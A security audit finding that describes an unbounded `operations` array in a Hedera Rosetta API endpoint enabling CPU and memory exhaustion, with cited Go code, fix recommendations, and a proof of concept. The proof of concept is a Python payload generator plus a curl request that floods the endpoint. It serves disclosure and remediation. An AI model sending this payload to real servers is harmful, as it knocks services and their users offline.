### Title
Unbounded Operations Array in `/construction/preprocess` Enables CPU/Memory Exhaustion DoS

### Summary
The `/construction/preprocess` endpoint accepts an arbitrarily large `operations` array with no application-level size limit or body size cap. The server performs O(N) CPU and memory work across multiple sequential iteration passes before returning any error, allowing an unauthenticated attacker to exhaust server resources by submitting a single crafted request with a massive operations array.

### Finding Description

**Full code path:**

1. `ConstructionPreprocess` (construction_service.go:285-321) calls `getOperationSlice(request.Operations)` with no pre-check on array length.

2. `getOperationSlice` (construction_service.go:432-465) iterates over **every** operation unconditionally, calling `types.NewAccountIdFromString` and `types.NewAmount` per entry — allocating a new `types.OperationSlice` of capacity N:
   ```go
   operationSlice := make(types.OperationSlice, 0, len(operations))
   for _, operation := range operations {  // O(N), no bound
       ...
       operationSlice = append(operationSlice, ...)
   }
   ```

3. `compositeTransactionConstructor.validate` (composite_transaction_constructor.go:83-105) then iterates over `operations[1:]` — another O(N) pass — checking type consistency before dispatching to a sub-constructor.

4. For `CRYPTOTRANSFER` (the most permissive path), `cryptoTransferTransactionConstructor.preprocess` (crypto_transfer_transaction_constructor.go:120-161) calls `validateOperations(operations, 0, ...)` with `size=0` (no count limit), then iterates all N operations building a `senderMap`, `totalAmounts` map, and `transfers` slice — a third O(N) pass with heap allocations per entry.

5. For `CRYPTOCREATE`, `validateOperations(operations, 1, ...)` (common.go:123-125) returns `ErrInvalidOperations` immediately if `len != 1`, but only **after** `getOperationSlice` and `validate` have already completed their full O(N) passes.

**Root cause:** No maximum body size is set on the HTTP server (`main.go:220-227` — no `http.MaxBytesReader`), and no operations count limit exists at any layer before O(N) processing begins. The `ReadTimeout` of 5 seconds (default `5000000000` ns) is the only server-side constraint, but a fast connection can deliver hundreds of thousands of operations within that window.

**Why existing checks are insufficient:**
- The Traefik `inFlightReq` (5 concurrent) and `rateLimit` (10 req/s) middleware (charts/hedera-mirror-rosetta/values.yaml:152-161) are optional Helm chart configurations, not enforced at the application layer.
- `ReadTimeout` limits body ingestion time but not the size of what is ingested or the CPU/memory consumed processing it.
- The Rosetta SDK asserter validates network identifier and non-empty operations but imposes no count ceiling.

### Impact Explanation
A single request with ~500,000 operations (feasible within the 5-second read window on a normal connection) triggers multiple full-array iterations with per-element heap allocations, consuming gigabytes of memory and saturating a CPU core. With 5 concurrent connections (the Traefik default, if deployed), this can fully exhaust a typical pod's resources. Because `/construction/preprocess` is available in both online and offline modes and requires zero authentication, the attack surface is maximally exposed. This directly impacts availability of the Rosetta API, which is a critical path for exchange integrations on a network with significant market capitalization.

### Likelihood Explanation
The attack requires no credentials, no prior knowledge of the system state, and no special tooling — a single `curl` command with a generated JSON payload suffices. It is trivially repeatable and automatable. The only friction is the 5-second read window, which still permits very large payloads on any reasonable network link.

### Recommendation
1. **Enforce a body size limit at the HTTP layer** by wrapping the request body with `http.MaxBytesReader` in the server handler or middleware (e.g., 1 MB).
2. **Add an application-level operations count cap** at the start of `getOperationSlice` (construction_service.go:432) and/or at the top of `ConstructionPreprocess` (construction_service.go:285), rejecting requests exceeding a reasonable maximum (e.g., 1,000 operations).
3. **Make the Traefik rate-limiting and in-flight request middleware mandatory** rather than optional chart configuration, or replicate equivalent controls inside the Go application.

### Proof of Concept

```bash
# Generate a payload with 500,000 CRYPTOTRANSFER operations
python3 -c "
import json, sys
ops = []
for i in range(500000):
    ops.append({
        'operation_identifier': {'index': i},
        'type': 'CRYPTOTRANSFER',
        'account': {'address': '0.0.' + str(i+1)},
        'amount': {'value': str(-(i+1)), 'currency': {'symbol': 'HBAR', 'decimals': 8}}
    })
payload = {
    'network_identifier': {'blockchain': 'Hedera', 'network': 'testnet'},
    'operations': ops
}
json.dump(payload, sys.stdout)
" > large_payload.json

# Send to the endpoint (no authentication required)
curl -X POST http://<rosetta-host>:5700/construction/preprocess \
  -H 'Content-Type: application/json' \
  -d @large_payload.json
```

The server will consume O(N) memory and CPU across three full iteration passes over the 500,000-element array before returning `ErrInvalidOperationsTotalAmount`. Repeating this with multiple concurrent connections exhausts available resources. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** rosetta/app/services/construction_service.go (L285-294)
```go
func (c *constructionAPIService) ConstructionPreprocess(
	ctx context.Context,
	request *rTypes.ConstructionPreprocessRequest,
) (*rTypes.ConstructionPreprocessResponse, *rTypes.Error) {
	operations, rErr := c.getOperationSlice(request.Operations)
	if rErr != nil {
		return nil, rErr
	}

	signers, err := c.transactionHandler.Preprocess(ctx, operations)
```

**File:** rosetta/app/services/construction_service.go (L432-465)
```go
func (c *constructionAPIService) getOperationSlice(operations []*rTypes.Operation) (
	types.OperationSlice,
	*rTypes.Error,
) {
	operationSlice := make(types.OperationSlice, 0, len(operations))
	for _, operation := range operations {
		var accountId types.AccountId
		if operation.Account != nil {
			var err error
			accountId, err = types.NewAccountIdFromString(operation.Account.Address, c.systemShard, c.systemRealm)
			if err != nil || accountId.IsZero() {
				return nil, errors.ErrInvalidAccount
			}
		}

		var amount types.Amount
		var rErr *rTypes.Error
		if operation.Amount != nil {
			if amount, rErr = types.NewAmount(operation.Amount); rErr != nil {
				return nil, rErr
			}
		}

		operationSlice = append(operationSlice, types.Operation{
			AccountId: accountId,
			Amount:    amount,
			Index:     operation.OperationIdentifier.Index,
			Metadata:  operation.Metadata,
			Type:      operation.Type,
		})
	}

	return operationSlice, nil
}
```

**File:** rosetta/app/services/construction/composite_transaction_constructor.go (L83-105)
```go
func (c *compositeTransactionConstructor) validate(operations types.OperationSlice) (
	transactionConstructorWithType,
	*rTypes.Error,
) {
	if len(operations) == 0 {
		return nil, errors.ErrEmptyOperations
	}

	operationType := operations[0].Type
	for _, operation := range operations[1:] {
		if operation.Type != operationType {
			return nil, errors.ErrMultipleOperationTypesPresent
		}
	}

	h, ok := c.constructorsByOperationType[operationType]
	if !ok {
		log.Errorf("Operation type %s is not supported", operationType)
		return nil, errors.ErrOperationTypeUnsupported
	}

	return h, nil
}
```

**File:** rosetta/app/services/construction/crypto_transfer_transaction_constructor.go (L120-161)
```go
func (c *cryptoTransferTransactionConstructor) preprocess(operations types.OperationSlice) (
	[]transfer,
	[]types.AccountId,
	*rTypes.Error,
) {
	if err := validateOperations(operations, 0, c.GetOperationType(), false); err != nil {
		return nil, nil, err
	}

	senderMap := senderMap{}
	totalAmounts := make(map[string]int64)
	transfers := make([]transfer, 0, len(operations))

	for _, operation := range operations {
		accountId := operation.AccountId
		amount := operation.Amount
		if amount.GetValue() == 0 {
			return nil, nil, errors.ErrInvalidOperationsAmount
		}

		sdkAccountId, err := accountId.ToSdkAccountId()
		if err != nil {
			return nil, nil, errors.ErrInvalidAccount
		}
		transfers = append(transfers, transfer{account: sdkAccountId, amount: amount})

		if amount.GetValue() < 0 {
			senderMap[accountId.String()] = accountId
		}

		totalAmounts[amount.GetSymbol()] += amount.GetValue()
	}

	for symbol, totalAmount := range totalAmounts {
		if totalAmount != 0 {
			log.Errorf("Transfer sum for symbol %s is not 0", symbol)
			return nil, nil, errors.ErrInvalidOperationsTotalAmount
		}
	}

	return transfers, senderMap.toSenders(), nil
}
```

**File:** rosetta/app/services/construction/common.go (L118-142)
```go
func validateOperations(operations types.OperationSlice, size int, opType string, expectNilAmount bool) *rTypes.Error {
	if len(operations) == 0 {
		return errors.ErrEmptyOperations
	}

	if size != 0 && len(operations) != size {
		return errors.ErrInvalidOperations
	}

	for _, operation := range operations {
		if expectNilAmount && operation.Amount != nil {
			return errors.ErrInvalidOperations
		}

		if !expectNilAmount && operation.Amount == nil {
			return errors.ErrInvalidOperations
		}

		if operation.Type != opType {
			return errors.ErrInvalidOperationType
		}
	}

	return nil
}
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
